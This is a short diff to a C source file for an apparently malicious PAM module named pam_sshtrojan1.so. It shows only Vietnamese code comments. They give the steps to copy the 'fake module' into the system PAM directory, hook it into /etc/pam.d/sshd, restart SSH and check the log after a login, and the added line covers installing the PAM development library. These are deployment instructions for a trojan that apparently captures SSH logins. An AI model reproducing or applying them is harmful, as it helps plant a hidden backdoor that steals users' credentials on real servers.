@@ -30,3 +30,4 @@ PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const cha
 // mv pam_sshtrojan1.so /lib/x86_64-linux-gnu/security 
 // sau khi move fake module vào lib chứa các module liên quan đến Pluggable Authentication Modules (PAM) trên các hệ thống Linux 64-bit -> cấu hình PAM sshd 
 // thêm auth  required  pam_sshtrojan1.so vào cuối file /etc/pam.d/sshd -> restart service -> login ssh and check log
+// nếu chưa cài PAM lib :  sudo apt-get install libpam0g-dev
